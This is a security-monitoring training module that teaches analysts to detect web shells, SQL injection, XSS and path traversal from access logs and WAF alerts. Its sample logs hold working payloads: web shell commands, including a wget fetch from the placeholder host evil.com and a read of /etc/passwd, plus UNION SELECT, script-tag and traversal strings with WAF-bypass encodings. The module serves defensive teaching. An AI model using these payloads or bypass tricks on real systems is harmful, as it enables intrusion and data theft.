Module 8: Web Security Monitoring

Web applications are the most attacked vector. This module teaches you to detect web shells, SQL injection, XSS, path traversal, and other web-based attacks from logs and WAF alerts.

Sub-Domains / Rooms

🔹 Detecting Web Shells

A web shell is a malicious script uploaded to a web server that gives attackers remote control. They can execute system commands, browse files, and pivot to internal networks.

Common Web Shell Detection Methods:

1. File Upload Monitoring:
Check web server access logs for file uploads:
192.168.1.100 - - [21/May/2026:14:32:15 +0000] "POST /uploads/ HTTP/1.1" 200 234 "-" "Mozilla/5.0"
If followed by GET requests to the uploaded file with cmd parameters, it's a web shell.

2. Command Execution Detection:
GET /uploads/shell.php?cmd=id HTTP/1.1" 200
GET /uploads/shell.php?cmd=ls%20-la HTTP/1.1" 200
GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200
GET /uploads/shell.php?cmd=wget%20http://evil.com/tools.sh HTTP/1.1" 200
Pattern: Same file accessed with different cmd= parameters — clear web shell behavior.

3. WAF Detection:
WAF rules typically detect: Request URI contains "cmd=" OR "exec=" OR "shell=" combined with suspicious extensions (.php, .asp, .jsp) in upload directories.

4. File Integrity Monitoring:
Use tools like OSSEC or Tripwire to alert when files in web directories change unexpectedly.

🔹 Web Attack Investigation Rooms

Practice investigating SQL injection, XSS, path traversal, SSRF, and file upload vulnerabilities from logs.

SQL Injection Investigation:
You receive a WAF alert: "SQL Injection Attempt Blocked"
Check the web access log:
GET /products?id=1'+OR+'1'%3D'1 HTTP/1.1" 200
GET /products?id=1'+UNION+SELECT+null,null,null-- HTTP/1.1" 200
GET /products?id=1'+UNION+SELECT+@@version,null,null-- HTTP/1.1" 200

Analysis: The attacker tested basic SQLi with OR 1=1 (page returned 200 = vulnerable), then used UNION SELECT to enumerate columns, then tried to extract database version.
Detection SPL (Splunk):
index=webserver | search uri=*products* AND uri=*UNION* OR uri=*OR*1=1*
| stats count by src_ip, uri | where count > 3

XSS Investigation:
GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200
GET /search?q=<img+src=x+onerror=alert('xss')> HTTP/1.1" 200
GET /search?q=<svg+onload=alert('xss')> HTTP/1.1" 200

Analysis: Attacker testing reflected XSS by injecting different HTML/JavaScript payloads into the search parameter. The page returned 200 with the script rendered — vulnerability confirmed.
Detection: WAF rule blocking <script>, onerror=, onload= patterns in request parameters.

Path Traversal Investigation:
GET /../../../../etc/passwd HTTP/1.1" 200
GET /../../../windows/system32/drivers/etc/hosts HTTP/1.1" 200
GET /..%2e..%2e..%2e..%2eetc/passwd HTTP/1.1" 200

Analysis: Attacker used ../ sequences and URL-encoded variants (%2e%2e/) to navigate outside the web root and read system files.
WAF Bypass Attempts:
- Double URL encoding: %252e%252e%252f (WAF decodes once, web server decodes again)
- Unicode encoding: ..%c0%ae%c0%ae/ (IIS unicode vulnerability)
- Using \\ instead of /: ..\\..\\..\\windows\\win.ini
Web Attack Investigation Playbook
When investigating a web attack alert, follow these steps:

1. Identify the attacker IP: Check source IP in the alert, look up in threat intel (VirusTotal, AbuseIPDB)
2. Determine the attack type: Is it SQLi, XSS, path traversal, file upload, SSRF, or something else?
3. Check if the attack succeeded: Did the server return 200 (success) or 403/500 (blocked)?
4. Find what was accessed: Look for subsequent requests — did they read files, download tools, or extract data?
5. Assess impact: Check database logs for data extraction, check for new user accounts, check outbound traffic for exfiltration
6. Containment: Block attacker IP, patch vulnerability (input validation, parameterized queries), rotate any exposed credentials
7. Forensic evidence: Save web server logs, WAF logs, and database logs before they rotate
